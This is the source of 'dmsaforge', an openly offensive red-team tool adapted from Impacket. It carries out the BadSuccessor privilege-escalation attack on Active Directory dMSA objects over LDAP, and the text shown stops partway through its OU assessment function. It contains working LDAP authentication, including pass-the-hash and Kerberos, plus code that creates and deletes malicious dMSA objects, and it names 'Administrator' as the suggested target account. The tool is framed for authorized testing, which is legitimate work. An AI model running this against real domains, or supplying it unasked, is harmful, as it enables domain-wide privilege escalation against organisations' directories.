#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Upstream basis:
#   Impacket examples/badsuccessor.py
#   Original author: Ilya Yatsenko (@fulc2um)
#
# Modifications by:
#   RedteamNotes
#
# Description:
#   A redteaming tool for authorized BadSuccessor LDAP exploitation on dMSA:
#   assess, add, verify, and delete.
#   Assessment function is based on AKAMAI Get-BadSuccessorOUPermissions.ps1:
#   https://github.com/akamai/BadSuccessor/blob/main/Get-BadSuccessorOUPermissions.ps1
#   This version keeps Impacket attribution/licensing, but heavily refactors the
#   add/verify/delete paths to avoid optimistic success and incomplete dMSA objects.


import argparse
import logging
import os
import re
import secrets
import shlex
import socket
import string
import subprocess
import sys
import time
import uuid
import warnings

from . import __version__
from .ad_utils import (
    DMSA_NAME_RE,
    DN_ATTR_RE,
    DN_OID_ATTR_RE,
    DNS_HOSTNAME_RE,
    DOMAIN_RE,
    IPV4_LIMITED_BROADCAST,
    IPV4_RE,
    SID_RE,
    account_has_inline_secret,
    auto_dc_ip_rejection_reason,
    base_dn_from_dn_context,
    current_base_dn,
    derived_base_dn_from_account,
    display_base_dn,
    dn_in_scope,
    dn_rdns_for_display,
    domain_from_account_hint,
    domain_from_base_dn,
    domain_to_base_dn,
    effective_dns_hostname,
    effective_port,
    escape_dn_value,
    escape_filter_chars,
    find_unescaped,
    format_dn_for_display,
    format_value_for_display,
    has_unescaped_boundary_space,
    is_escaped_at,
    is_ipv4_address,
    is_usable_auto_dc_ip,
    looks_like_dn,
    normalize_dn,
    normalized_dmsa_name,
    parent_ou_from_dn,
    parse_account_hint,
    parse_dn,
    planned_dmsa_dn,
    redact_account,
    resolve_ipv4_address,
    split_unescaped,
    validate_dmsa_name,
    validate_dn_component_boundary,
    validate_dn_syntax,
    validate_dn_value,
    validate_dns_hostname,
    validate_domain_name,
    validate_sid_syntax,
)
from .cli_metadata import (
    ACTION_CHOICES,
    ACTION_HELP,
    ACTION_REQUIREMENTS,
    ACTION_SUMMARY,
    ACTION_USAGE,
    ASSESS_ACTIONS,
    DESTRUCTIVE_ACTIONS,
    OPTION_ALIASES,
    PROFILE_CHOICES,
    SUBCOMMAND_CHOICES,
    UPDATE_HELP,
    VISIBLE_ACTION_CHOICES,
)
from .completion import completion_script
from .kerberos import kerberos_guidance_lines, ticket_name_for_user
from .reporting import emit_report, redact_report, report_to_text, write_output_file
from .self_update import (
    DEFAULT_UPDATE_SOURCE,
    DEFAULT_UPDATE_VERSION_URL,
    build_update_command,
    command_to_text,
    explicit_version_from_update_source,
    latest_release_version,
    normalize_version_for_update,
    resolve_update_target_version,
    run_update_workflow,
    update_source_for_command,
    update_versions_match,
)

TOOL_NAME = 'dmsaforge'
TOOL_VERSION = 'v%s' % __version__
TOOL_DESCRIPTION = 'A redteaming tool for authorized BadSuccessor LDAP exploitation on dMSA: assess, add, verify, and delete.'
SCHEMA_VERSION = '1.0'
MODIFICATIONS_BY = 'RedteamNotes'
PROJECT_URL = 'https://github.com/RedteamNotes/dmsa-forge'
DEFAULT_SUGGESTED_DMSA_NAME = 'redpen'
SUGGESTED_TARGET_ACCOUNT = 'Administrator'
PRINCIPALS_ALLOWED_PLACEHOLDER = 'SID_OR_NAME'
BADSUCCESSOR_RIGHTS_LABEL = 'BadSuccessor-relevant OU rights'
BADSUCCESSOR_RIGHTS_MEANING = 'create dMSA objects or control listed OUs'
NEXT_STEP_PREFIX_ENV = 'DMSA_FORGE_NEXT_STEP_PREFIX'
LDAP_BASE = 'BASE'
LDAP_LEVEL = 'LEVEL'
LDAP_SUBTREE = 'SUBTREE'
LDAP_SD_FLAGS_DEFAULT = 0x05
DEFAULT_VERIFY_ATTEMPTS = 3
DEFAULT_VERIFY_DELAY = 2
DEFAULT_LDAP_TIMEOUT = 30.0
DMSA_EXPECTED_DELEGATED_STATE = '2'
DMSA_DELEGATED_STATE_MEANINGS = {
    '2': 'migration complete',
}
ANSI_YELLOW = '\033[33m'
ANSI_RED = '\033[31m'
ANSI_BOLD_RED = '\033[1;31m'
ANSI_RESET = '\033[0m'
HELP_WIDTH = 220
HELP_MAX_POSITION = 64

ASCII_BANNER = r'''
    . .    . .-.    .          .---.
    | |\  /|(   )  / \         |
 .-.| | \/ | `-.  /___\   ____ |--- .-. .--..-.. .-.
(   | |    |(   )/     \       |   (   )|  (   |(.-'
 `-'`-'    ' `-''       `      '    `-' '   `-`| `--'
                                            ._.'
'''

warnings.filterwarnings(
    'ignore',
    message=r'Python 3\.8 is no longer supported by the Python core team.*',
)


def security_descriptor_control(sdflags=LDAP_SD_FLAGS_DEFAULT):
    return {'sdflags': sdflags}


def format_dmsa_delegated_state(value):
    if value in (None, ''):
        return 'Unknown'
    state = str(value)
    meaning = DMSA_DELEGATED_STATE_MEANINGS.get(state)
    if meaning:
        return '%s - %s' % (state, meaning)
    return state


class TerminalColorFormatter(logging.Formatter):
    def __init__(self, inner_formatter=None):
        super().__init__()
        self.inner_formatter = inner_formatter or logging.Formatter('%(levelname)s: %(message)s')

    def format(self, record):
        text = self.inner_formatter.format(record)
        if record.levelno >= logging.CRITICAL:
            return '%s%s%s' % (ANSI_BOLD_RED, text, ANSI_RESET)
        if record.levelno >= logging.ERROR:
            return '%s%s%s' % (ANSI_RED, text, ANSI_RESET)
        if record.levelno >= logging.WARNING:
            return '%s%s%s' % (ANSI_YELLOW, text, ANSI_RESET)
        return text


class WideHelpFormatter(argparse.RawDescriptionHelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=HELP_MAX_POSITION, width=HELP_WIDTH)


def log_section(title, leading_blank=True):
    if leading_blank:
        log_blank()
    logging.info('%s:' % title)


def log_blank():
    if logging.getLogger().isEnabledFor(logging.INFO):
        sys.stderr.write('\n')


def log_kv(label, value, width=24):
    logging.info('%-*s %s' % (width, label, value))


try:
    from impacket.examples import logger
    from impacket.examples.utils import parse_identity, parse_target
    from impacket.ldap import ldaptypes
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
    _IMPACKET_IMPORT_ERROR = None
except ImportError as e:
    logger = None
    parse_identity = None
    parse_target = None
    ldaptypes = None
    impacket_ldap = None
    ldapasn1 = None
    _IMPACKET_IMPORT_ERROR = e

try:
    from pyasn1.codec.ber import encoder
    from pyasn1.type import namedtype, univ
    _PYASN1_IMPORT_ERROR = None
except ImportError as e:
    encoder = None
    namedtype = None
    univ = None
    _PYASN1_IMPORT_ERROR = e


if univ is not None:
    class _SDFlagsRequestValue(univ.Sequence):
        componentType = namedtype.NamedTypes(
            namedtype.NamedType('Flags', univ.Integer())
        )
else:
    _SDFlagsRequestValue = None


class _LDAPAttribute:
    def __init__(self, name, raw_values):
        self.name = name
        self.raw_values = raw_values
        self.values = [self._convert_value(name, value) for value in raw_values]
        self.value = self.values[0] if self.values else None

    @staticmethod
    def _convert_value(name, value):
        lname = name.lower()
        if lname in ('objectsid', 'tokengroups'):
            try:
                return ldaptypes.LDAP_SID(data=value).formatCanonical()
            except Exception:
                return value

        if lname in ('ntsecuritydescriptor', 'msds-groupmsamembership'):
            return value

        if isinstance(value, bytes):
            try:
                return value.decode('utf-8')
            except UnicodeDecodeError:
                return value
        return value

    def __str__(self):
        return str(self.value)


class _LDAPEntry:
    def __init__(self, dn, attributes):
        self.entry_dn = dn
        self._attrs = {name.lower(): _LDAPAttribute(name, values) for name, values in attributes.items()}

    @staticmethod
    def from_impacket_answer(answer):
        dn = str(answer['objectName'])
        attributes = {}

        for attr in answer['attributes']:
            name = str(attr['type'])
            raw_values = []
            for value in attr['vals']:
                if hasattr(value, 'asOctets'):
                    raw_values.append(value.asOctets())
                else:
                    raw_values.append(bytes(value))
            attributes[name] = raw_values

        return _LDAPEntry(dn, attributes)

    def __contains__(self, item):
        return item.lower() in self._attrs

    def __getitem__(self, item):
        return self._attrs[item.lower()]

    def __getattr__(self, item):
        key = item.lower()
        if key in self._attrs:
            return self._attrs[key]
        raise AttributeError(item)


class TemporarySocketDefaultTimeout:
    def __init__(self, timeout):
        self.timeout = timeout
        self.previous = None

    def __enter__(self):
        if self.timeout is None:
            return self
        self.previous = socket.getdefaulttimeout()
        socket.setdefaulttimeout(self.timeout)
        return self

    def __exit__(self, exc_type, exc, tb):
        if self.timeout is not None:
            socket.setdefaulttimeout(self.previous)


def apply_socket_timeout(obj, timeout):
    if obj is None or timeout is None:
        return
    candidates = [obj]
    for name in (
        'socket',
        '_socket',
        '_sock',
        'sock',
        '_Socket',
        '_LDAPConnection__socket',
        '_LDAPConnection__socketFile',
        '_connection',
        '_transport',
    ):
        try:
            value = getattr(obj, name)
        except Exception:
            continue
        if value is not None:
            candidates.append(value)
    for candidate in candidates:
        setter = getattr(candidate, 'settimeout', None)
        if callable(setter):
            try:
                setter(timeout)
            except Exception:
                pass


class LDAPCompat:
    def __init__(self, domain, username, password, lmhash, nthash, aes_key, do_kerberos,
                 target_host, dc_ip, base_dn, use_ldaps, kdc_host, port=None, timeout=DEFAULT_LDAP_TIMEOUT):
        self.entries = []
        self.result = None
        self.bound = False
        self._timeout = timeout

        scheme = 'ldaps' if use_ldaps else 'ldap'
        with TemporarySocketDefaultTimeout(self._timeout):
            self._conn = impacket_ldap.LDAPConnection(
                '%s://%s' % (scheme, target_host),
                base_dn,
                dstIp=dc_ip,
                signing=not use_ldaps
            )
            apply_socket_timeout(self._conn, self._timeout)

            if do_kerberos:
                self._conn.kerberosLogin(
                    username, password, domain, lmhash, nthash, aes_key,
                    kdcHost=kdc_host,
                    useCache=True
                )
            else:
                self._conn.login(
                    username, password, domain, lmhash, nthash,
                    authenticationChoice='sasl'
                )
            apply_socket_timeout(self._conn, self._timeout)

        self.bound = True
        self.result = {'result': 0, 'description': 'success', 'message': ''}

    def _scope(self, search_scope):
        if search_scope == LDAP_BASE:
            return impacket_ldap.Scope('baseObject')
        if search_scope == LDAP_LEVEL:
            return impacket_ldap.Scope('singleLevel')
        return impacket_ldap.Scope('wholeSubtree')

    def _security_descriptor_control(self, sdflags=LDAP_SD_FLAGS_DEFAULT):
        if _SDFlagsRequestValue is None or encoder is None:
            raise RuntimeError('pyasn1 is required to build LDAP security descriptor controls')

        value = _SDFlagsRequestValue()
        value.setComponentByName('Flags', sdflags)

        control = impacket_ldap.Control()
        control['controlType'] = '1.2.840.113556.1.4.801'
        control['criticality'] = True
        control['controlValue'] = encoder.encode(value)
        return control

    def _controls(self, controls):
        if not controls:
            return None

        control_list = [controls] if isinstance(controls, dict) else list(controls)
        for control in control_list:
            if isinstance(control, dict) and 'sdflags' in control:
                return [self._security_descriptor_control(int(control['sdflags']))]

        return [self._security_descriptor_control()]

    def _set_success(self):
        self.result = {'result': 0, 'description': 'success', 'message': ''}

    def _set_error(self, exc):
        code = exc.getErrorCode() if hasattr(exc, 'getErrorCode') else None
        self.result = {
            'result': code if code is not None else -1,
            'description': 'error',
            'message': str(exc),
        }

    def search(self, search_base=None, search_filter='(objectClass=*)', search_scope=LDAP_SUBTREE,
               attributes=None, controls=None, **kwargs):
        try:
            apply_socket_timeout(self._conn, self._timeout)
            with TemporarySocketDefaultTimeout(self._timeout):
                answers = self._conn.search(
                    searchBase=search_base,
                    scope=self._scope(search_scope),
                    searchFilter=search_filter,
                    attributes=attributes or [],
                    searchControls=self._controls(controls)
                )
            self.entries = self._entries_from_answers(answers)
            self._set_success()
            return True
        except impacket_ldap.LDAPSearchError as e:
            self.entries = self._entries_from_answers(e.getAnswers())
            self._set_error(e)
            return False
        except Exception as e:
            self.entries = []
            self._set_error(e)
            return False

    def _answer_is_entry(self, answer):
        if ldapasn1 is not None and hasattr(ldapasn1, 'SearchResultEntry') and hasattr(answer, 'isSameTypeWith'):
            try:
                return bool(answer.isSameTypeWith(ldapasn1.SearchResultEntry()))
            except Exception:
                pass
        try:
            answer['objectName']
            answer['attributes']
            return True
        except Exception:
            return False

    def _entries_from_answers(self, answers):
        entries = []
        skipped = 0
        for answer in answers or []:
            if not self._answer_is_entry(answer):
                skipped += 1
                continue
            try:
                entries.append(_LDAPEntry.from_impacket_answer(answer))
            except Exception as e:
                skipped += 1
                logging.debug('Skipped LDAP search answer that could not be parsed as an entry: %s' % e)
        if skipped:
            logging.debug('Skipped %d LDAP search result reference/non-entry answers.' % skipped)
        return entries

    @staticmethod
    def _ldap_value(value):
        # LDAP attribute values are OCTET STRINGs.  Text values can be passed as
        # Python strings, but binary security descriptors must be kept as raw
        # octets.  Passing bytes directly is not reliable across Impacket/pyasn1
        # builds, so wrap them explicitly.
        if isinstance(value, bytearray):
            return univ.OctetString(bytes(value))
        if isinstance(value, bytes):
            return univ.OctetString(value)
        if isinstance(value, bool):
            return 'TRUE' if value else 'FALSE'
        if isinstance(value, int):
            return str(value)
        return value

    @staticmethod
    def _operation_code(operation):
        if isinstance(operation, int):
            return operation
        op = str(operation).upper()
        if 'ADD' in op:
            return 0
        if 'DELETE' in op:
            return 1
        if 'REPLACE' in op:
            return 2
        if 'INCREMENT' in op:
            return 3
        return operation

    @staticmethod
    def _ldap_result_ok(protocol_op, response_name, request_name):
        response = protocol_op[response_name]
        result_code = response['resultCode']
        if int(result_code) != 0:
            diagnostic = response['diagnosticMessage']
            if hasattr(result_code, 'prettyPrint'):
                result_code = result_code.prettyPrint()
            if hasattr(diagnostic, 'prettyPrint'):
                diagnostic = diagnostic.prettyPrint()
            raise Exception('Error in %s -> %s: %s' % (request_name, result_code, diagnostic))
        return True

    def add(self, dn, objectClass=None, attributes=None, controls=None):
        try:
            apply_socket_timeout(self._conn, self._timeout)
            attrs = dict(attributes or {})
            object_classes = objectClass if objectClass is not None else attrs.pop('objectClass', [])
            if isinstance(object_classes, str):
                object_classes = [object_classes]

            with TemporarySocketDefaultTimeout(self._timeout):
                # Newer Impacket builds have LDAPConnection.add(); Kali's packaged dev build may not.
                if hasattr(self._conn, 'add'):
                    self._conn.add(dn, object_classes, attrs, controls=self._controls(controls))
                else:
                    add_request = ldapasn1.AddRequest()
                    add_request['entry'] = dn
                    add_request['attributes'][0]['type'] = 'objectClass'
                    add_request['attributes'][0]['vals'].setComponents(*[self._ldap_value(v) for v in object_classes])

                    index = 1
                    for key, value in attrs.items():
                        add_request['attributes'][index]['type'] = key
                        if isinstance(value, (list, tuple)):
                            vals = [self._ldap_value(v) for v in value]
                        else:
                            vals = [self._ldap_value(value)]
                        add_request['attributes'][index]['vals'].setComponents(*vals)
                        index += 1

                    protocol_op = self._conn.sendReceive(add_request, self._controls(controls))[0]['protocolOp']
                    self._ldap_result_ok(protocol_op, 'addResponse', 'addRequest')

            self._set_success()
            return True
        except Exception as e:
            self._set_error(e)
            return False

    def delete(self, dn, controls=None):
        try:
            apply_socket_timeout(self._conn, self._timeout)
            with TemporarySocketDefaultTimeout(self._timeout):
                if hasattr(self._conn, 'delete'):
                    self._conn.delete(dn, controls=self._controls(controls))
                else:
                    delete_request = ldapasn1.DelRequest(dn)
                    protocol_op = self._conn.sendReceive(delete_request, self._controls(controls))[0]['protocolOp']
                    self._ldap_result_ok(protocol_op, 'delResponse', 'deleteRequest')

            self._set_success()
            return True
        except Exception as e:
            self._set_error(e)
            return False

    def unbind(self):
        self.close()

    def close(self):
        self.bound = False
        if hasattr(self._conn, 'close'):
            self._conn.close()


class DMSAForge:
    def __init__(self, username, password, domain, lmhash, nthash, options):
        self._username = username
        self._password = password
        self._domain = domain
        self._lmhash = lmhash
        self._nthash = nthash
        self._aes_key = options.aes_key
        self._do_kerberos = options.k
        self._target = options.dc_host
        self._kdc_host = options.dc_host
        self._dmsa_name = options.dmsa_name
        self._method = options.method
        self._port = options.port
        self._action = options.action
        self._target_ip = options.dc_ip
        self._base_dn = options.base_dn
        self._target_ou = options.target_ou
        self._principals_allowed = options.principals_allowed
        self._target_account = options.target_account
        self._dns_hostname = options.dns_hostname
        self._kdc_wait = options.kdc_wait
        self._verify_attempts = options.verify_attempts
        self._verify_delay = options.verify_delay
        self._timeout = options.timeout
        self._allow_admin_fallback = options.allow_admin_fallback
        self._kerberos_guidance = options.kerberos_guidance
        self._operation_id = options.operation_id
        self._redact = options.redact
        self._scope_base_dn = options.scope_base_dn
        self._scope_domain = options.scope_domain
        self._search_summary = options.search_summary or not options.include_sd
        self._search_include_sd = options.include_sd
        self._search_resolve_names = options.resolve_names
        self._minimal = options.minimal
        self._quiet = options.quiet
        self._skip_dc_prereq = options.skip_dc_prereq
        self._options = options
        self._method_supplied = getattr(options, 'method_supplied', False)
        self._port_supplied = getattr(options, 'port_supplied', False)
        self._base_dn_supplied = getattr(options, 'base_dn_supplied', False)
        self._scope_base_dn_supplied = getattr(options, 'scope_base_dn_supplied', False)
        self._dmsa_name_supplied = getattr(options, 'dmsa_name_supplied', bool(options.dmsa_name))
        self._dns_hostname_supplied = getattr(options, 'dns_hostname_supplied', False)
        self.report = build_operation_report(options, mode='execute', success=None)

        if self._dmsa_name:
            self._dmsa_name = normalized_dmsa_name(self._dmsa_name)

        if self._kdc_wait is not None and self._kdc_wait < 0:
            raise ValueError("--kdc-wait must be 0 or greater")

        if self._target_ip is not None:
            self._kdc_host = self._target_ip

        if self._method not in ['LDAP', 'LDAPS']:
            raise ValueError("Unsupported method %s" % self._method)

        if self._do_kerberos and options.dc_host is None:
            raise ValueError("Kerberos auth requires DNS name of the target DC. Use --dc-host.")

        if self._method == 'LDAPS' and '.' not in self._domain:
            logging.warning('\'%s\' doesn\'t look like a FQDN. Generating base DN will probably fail.' % self._domain)

        if self._target is None:
            if '.' not in self._domain:
                logging.warning('No DC host set and \'%s\' doesn\'t look like a FQDN. DNS resolution of short names will probably fail.' % self._domain)
            self._target = self._domain

        if self._port is None:
            if self._method == 'LDAP':
                self._port = 389
            elif self._method == 'LDAPS':
                self._port = 636

    def _display_dn(self, dn):
        return format_dn_for_display(dn, base_dn=self._scope_base_dn or self._base_dn, redact=self._redact)

    def _display_value(self, value):
        return format_value_for_display(value, base_dn=self._scope_base_dn or self._base_dn, redact=self._redact)

    def _display_sid(self, sid):
        return sid

    def _display_principal(self, principal):
        return self._display_value(principal)

    def _set_report_result(self, **values):
        result = dict(self.report.get('result') or {})
        result.update(values)
        self.report['result'] = redact_report(result, self._options)

    def _set_report_failure(self, error_code, message, **values):
        values.update({
            'error_code': error_code,
            'error': message,
        })
        self._set_report_result(**values)

    def _record_inference(self, kind, status, detail, level=logging.INFO):
        event = {
            'kind': kind,
            'status': status,
            'detail': detail,
        }
        self.report.setdefault('inference', []).append(event)
        logging.log(level, 'Auto inference: %s %s - %s' % (kind, status, detail))

    def _update_report_connection(self, target_host, dc_ip):
        self.report['connection'] = {
            'dc_host': target_host,
            'dc_ip': dc_ip or '(not set)',
            'method': self._method,
            'port': self._port,
            'auth': 'kerberos' if self._do_kerberos else 'ntlm',
            'base_dn': self._display_dn(self._base_dn),
        }

    def _update_report_scope(self):
        self.report['scope'] = {
            'domain': self._scope_domain or '(not set)',
            'base_dn': self._display_dn(self._scope_base_dn) if self._scope_base_dn else '(not set)',
        }

    def _log_run_metadata(self, target_host, dc_ip):
        log_section('Run context', leading_blank=False)
        log_kv('Operation ID:', self._operation_id)
        log_kv('Action:', self._action)
        log_kv('Target DC:', dc_ip if dc_ip else target_host)
        log_kv('LDAP:', '%s/%d' % (self._method, self._port))
        log_kv('Auth:', 'Kerberos' if self._do_kerberos else 'NTLM')
        log_kv('Base DN:', self._display_dn(self._base_dn))

    def _connection_candidates(self):
        candidates = [(self._method, self._port, 'selected/default')]
        if not self._method_supplied and not self._port_supplied and self._method == 'LDAP' and self._port == 389:
            candidates.append(('LDAPS', 636, 'fallback because LDAP/389 failed and method/port were not explicit'))

        deduped = []
        seen = set()
        for method, port, reason in candidates:
            key = (method, port)
            if key in seen:
                continue
            seen.add(key)
            deduped.append((method, port, reason))
        return deduped

    def _connect_with_inferred_candidates(self, target_host, dc_ip):
        errors = []
        candidates = self._connection_candidates()
        for idx, (method, port, reason) in enumerate(candidates, 1):
            self._method = method
            self._port = port
            use_ldaps = (self._method == 'LDAPS')
            self._update_report_connection(target_host, dc_ip)
            if idx > 1:
                self._record_inference('connection', 'retry', '%s/%d: %s' % (method, port, reason), level=logging.WARNING)
            try:
                connection = LDAPCompat(
                    domain=self._domain,
                    username=self._username,
                    password=self._password,
                    lmhash=self._lmhash,
                    nthash=self._nthash,
                    aes_key=self._aes_key,
                    do_kerberos=self._do_kerberos,
                    target_host=target_host,
                    dc_ip=dc_ip,
                    base_dn=self._base_dn,
                    use_ldaps=use_ldaps,
                    kdc_host=self._kdc_host,
                    port=self._port,
                    timeout=self._timeout
                )
                if idx > 1:
                    self._record_inference('connection', 'selected', '%s/%d succeeded' % (method, port))
                return connection
            except Exception as e:
                errors.append('%s/%d: %s' % (method, port, e))
                if idx == 1 and len(candidates) > 1:
                    self._record_inference('connection', 'failed', '%s/%d failed: %s' % (method, port, e), level=logging.WARNING)

        message = 'Could not connect to LDAP server after inferred candidates.'
        logging.error('%s %s' % (message, '; '.join(errors)))
        self._set_report_failure('ldap_connect_failed', message, attempts=errors)
        return None

    def _probe_default_naming_context(self, ldap_connection):
        try:
            success = ldap_connection.search(
                search_base='',
                search_filter='(objectClass=*)',
                search_scope=LDAP_BASE,
                attributes=['defaultNamingContext']
            )
            if not success or not ldap_connection.entries:
                return None
            return self._entry_value(ldap_connection.entries[0], 'defaultNamingContext')
        except Exception as e:
            logging.debug('RootDSE defaultNamingContext probe failed: %s' % e)
            return None

    def _reconcile_root_dse_base_dn(self, ldap_connection, target_host, dc_ip):
        if self._base_dn_supplied:
            return
        if (
            self._base_dn
            and self._scope_base_dn
            and validate_dn_syntax(self._base_dn)
            and validate_dn_syntax(self._scope_base_dn)
            and normalize_dn(self._base_dn) == normalize_dn(self._scope_base_dn)
        ):
            return
        context = self._probe_default_naming_context(ldap_connection)
        if not context or not validate_dn_syntax(context):
            return
        if self._scope_base_dn and not dn_in_scope(context, self._scope_base_dn):
            self._record_inference(
                'base_dn',
                'kept',
                'RootDSE defaultNamingContext is outside scope guardrail; keeping %s' % self._display_dn(self._base_dn),
                level=logging.WARNING,
            )
            return
        if normalize_dn(context) == normalize_dn(self._base_dn):
            return
        old_base_dn = self._base_dn
        self._base_dn = context
        self._options.base_dn = context
        if self._scope_base_dn is None:
            self._scope_base_dn = context
            self._options.scope_base_dn = context
        if self._scope_domain is None:
            context_domain = domain_from_base_dn(context)
            if context_domain and validate_domain_name(context_domain):
                self._scope_domain = context_domain.lower()
                self._options.scope_domain = self._scope_domain
        self._record_inference(
            'base_dn',
            'selected',
            'RootDSE defaultNamingContext %s replaced %s' % (self._display_dn(context), self._display_dn(old_base_dn)),
        )
        self._update_report_connection(target_host, dc_ip)
        self._update_report_scope()

    def _default_dns_domain(self):
        candidates = [
            self._scope_domain,
            domain_from_base_dn(self._base_dn),
            self._domain,
        ]
        for candidate in candidates:
            candidate = str(candidate or '').strip().strip('.').lower()
            if validate_domain_name(candidate):
                return candidate
        return None

    def _effective_dns_hostname(self):
        if self._dns_hostname:
            return self._dns_hostname
        if not self._dmsa_name:
            return None
        domain = self._default_dns_domain()
        if not domain:
            return None
        dns_hostname = '%s.%s' % (self._dmsa_name.lower(), domain)
        self._record_inference('dns_hostname', 'selected', dns_hostname)
        return dns_hostname

    def run(self):
        # Create the base DN if not provided.
        if self._base_dn is None:
            domain_parts = self._domain.split('.')
            self._base_dn = ','.join(['DC=%s' % i for i in domain_parts if i])

        # For Kerberos authentication, ensure proper target resolution.
        if self._do_kerberos:
            target_host = self._target if self._target else self._domain
            dc_ip = self._kdc_host if self._kdc_host else self._target_ip
        else:
            target_host = self._target if self._target else self._domain
            dc_ip = self._target_ip

        self._update_report_connection(target_host, dc_ip)
        self._log_run_metadata(target_host, dc_ip)

        ldap_connection = None
        ldap_connection = self._connect_with_inferred_candidates(target_host, dc_ip)
        if ldap_connection is None:
            return False

        if not self._target_ip:
            resolved_dc_ip = resolve_ipv4_address(target_host)
            if resolved_dc_ip:
                rejection_reason = auto_dc_ip_rejection_reason(resolved_dc_ip)
                if rejection_reason:
                    self._record_inference(
                        'dc_ip',
                        'rejected',
                        '%s resolved to unusable %s; continuing without inferred --dc-ip' % (
                            target_host,
                            resolved_dc_ip,
                        ),
                        level=logging.WARNING,
                    )
                else:
                    self._target_ip = resolved_dc_ip
                    self._options.resolved_dc_ip = resolved_dc_ip
                    dc_ip = resolved_dc_ip
                    self._record_inference('dc_ip', 'selected', resolved_dc_ip)

        self._update_report_connection(target_host, dc_ip)
        self._reconcile_root_dse_base_dn(ldap_connection, target_host, dc_ip)

        connect_to = dc_ip if dc_ip else target_host
        log_section('Progress')
        logging.info('Connected to %s using %s/%d' % (connect_to, self._method, self._port))

        try:
            action_handlers = {
                'add': self.add_dmsa,
                'delete': self.delete_dmsa,
                'assess': self.search_ous,
                'verify': self.verify_dmsa,
            }
            handler = action_handlers.get(self._action)
            if handler is None:
                logging.error('Unknown action: %s' % self._action)
                self.report['success'] = False
                return False
            success = handler(ldap_connection)
            self.report['success'] = bool(success)
            return success
        finally:
            if ldap_connection is not None:
                ldap_connection.unbind()

    def delete_dmsa(self, ldap_connection):
        try:
            if not self._dmsa_name:
                message = 'dMSA name is required for deletion. Use --dmsa-name.'
                logging.error(message)
                self._set_report_failure('missing_dmsa_name', message)
                return False

            if not self._target_ou:
                message = 'Target OU is required for dMSA deletion. Use --ou.'
                logging.error(message)
                self._set_report_failure('missing_target_ou', message)
                return False

            dmsa_dn = 'CN=%s,%s' % (self._dmsa_name, self._target_ou)
            exists = self.check_account_exists(ldap_connection, dmsa_dn)
            if exists is None:
                message = 'Could not verify dMSA existence before deletion.'
                logging.error('%s %s' % (message, self._display_dn(dmsa_dn)))
                self._set_report_failure('pre_delete_existence_check_failed', message, dmsa_dn=self._display_dn(dmsa_dn), ldap_result=ldap_connection.result)
                return False
            if not exists:
                message = 'dMSA account does not exist.'
                logging.error('%s %s' % (message, self._display_dn(dmsa_dn)))
                self._set_report_failure('dmsa_not_found', message, dmsa_dn=self._display_dn(dmsa_dn))
                return False

            delete_success = ldap_connection.delete(dmsa_dn)
            verified_absent = False
            if delete_success:
                exists_after_delete = self.check_account_exists(ldap_connection, dmsa_dn)
                verified_absent = exists_after_delete is False
                if exists_after_delete is None:
                    logging.error('Could not verify post-delete absence: %s' % self._display_dn(dmsa_dn))

            log_section('Findings')
            log_kv("dMSA Name:", '%s$' % self._dmsa_name, width=30)
            log_kv("DeleteRequest:", "SUCCESS" if delete_success else "FAILED", width=30)
            log_kv("Post-delete Verification:", "SUCCESS" if verified_absent else "FAILED", width=30)

            if delete_success and not verified_absent:
                logging.error('DeleteRequest succeeded but object is still readable: %s' % self._display_dn(dmsa_dn))
            if not delete_success and ldap_connection.result:
                logging.error("%-30s %s" % ("Error:", ldap_connection.result))

            self._set_report_result(
                dmsa_name='%s$' % self._dmsa_name,
                dmsa_dn=self._display_dn(dmsa_dn),
                delete_request='SUCCESS' if delete_success else 'FAILED',
                post_delete_verification='SUCCESS' if verified_absent else 'FAILED',
                ldap_result=ldap_connection.result if not delete_success or not verified_absent else '',
            )
            return delete_success and verified_absent

        except Exception as e:
            message = 'dMSA deletion failed: %s' % str(e)
            logging.error(message)
            self._set_report_failure('delete_exception', message)
            return False

    def check_account_exists(self, ldap_connection, dn):
        try:
            success = ldap_connection.search(
                search_base=dn,
                search_filter='(objectClass=*)',
                search_scope=LDAP_BASE,
                attributes=['cn']
            )

            if success:
                return len(ldap_connection.entries) > 0

            if self._ldap_result_is_no_such_object(ldap_connection.result):
                logging.debug('Account existence check returned noSuchObject for %s; treating it as absent.' % self._display_dn(dn))
                return False

            logging.debug('Could not check account existence for %s: %s' % (self._display_dn(dn), ldap_connection.result))
            return None

        except Exception as e:
            logging.debug('Error checking account existence: %s' % str(e))
            return None

    def _ldap_result_text(self, result):
        if result is None:
            return ''
        if isinstance(result, dict):
            parts = []
            for key in ('result', 'description', 'message'):
                if key in result and result[key] is not None:
                    parts.append(str(result[key]))
            return ' '.join(parts)
        return str(result)

    def _ldap_result_is_already_exists(self, result):
        text = self._ldap_result_text(result).lower()
        return 'entryalreadyexists' in text or 'already exists' in text or 'object already exists' in text or ' 68 ' in (' %s ' % text)

    def _ldap_result_is_no_such_object(self, result):
        text = self._ldap_result_text(result).lower()
        if isinstance(result, dict) and result.get('result') == 32:
            return True
        return 'nosuchobject' in text or 'no such object' in text or 'no_object' in text or ' 32 ' in (' %s ' % text)

    def search_ous(self, ldap_connection):
        try:
            logging.info('Running BadSuccessor OU assessment in %s mode...' % ('summary' if self._search_summary else 'security-descriptor analysis'))

            if not ldap_connection.bound:
                message = 'LDAP connection is not bound.'
                logging.error(message)
                self._set_report_failure('ldap_not_bound', message)
                return False

            prereq_flag = None
            prereq_warning = None
            if not self._skip_dc_prereq:
                success = ldap_connection.search(
                    search_base=self._base_dn,
                    search_filter='(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
                    search_scope=LDAP_SUBTREE,
                    attributes=['operatingSystem', 'operatingSystemVersion']
                )

                if not success:
                    prereq_warning = 'Domain Controller prerequisite check failed; continuing OU assessment. %s' % ldap_connection.result
                    logging.warning(prereq_warning)
                else:
                    prereq_flag = False
                    for entry in ldap_connection.entries:
                        if 'operatingSystem' not in entry or 'operatingSystemVersion' not in entry:
                            logging.warning('Could not retrieve operating system information for Domain Controller: %s' % self._display_dn(entry.entry_dn))
                            continue
                        if 'Windows Server 2025' in str(entry.operatingSystem.value) or '26100' in str(entry.operatingSystemVersion.value):
                            logging.info('Found Windows Server 2025 Domain Controller: %s' % self._display_dn(entry.entry_dn))
